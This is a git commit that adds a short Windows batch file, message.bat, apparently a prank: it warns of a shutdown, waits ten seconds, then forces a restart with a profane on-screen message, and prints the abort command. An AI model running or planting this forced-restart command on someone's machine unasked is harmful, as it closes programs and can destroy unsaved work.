c298c96434a502ef85afb2ceaba17f485e15713a
MqMr <110939312+MqMrMqR@users.noreply.github.com>
2024-06-01 13:51:33 -0400

    Add files via upload

---
+++ message.bat
@@ -0,0 +1,7 @@
+echo Created By (killer)
+echo.
+echo Warning: The PC will shutdown after:
+timeout /t 10 /nobreak
+shutdown.exe -r -f -c "Your PC Got Fucked"
+echo.
+echo Note: To stop the project, use the command: shutdown.exe -a in the cmd
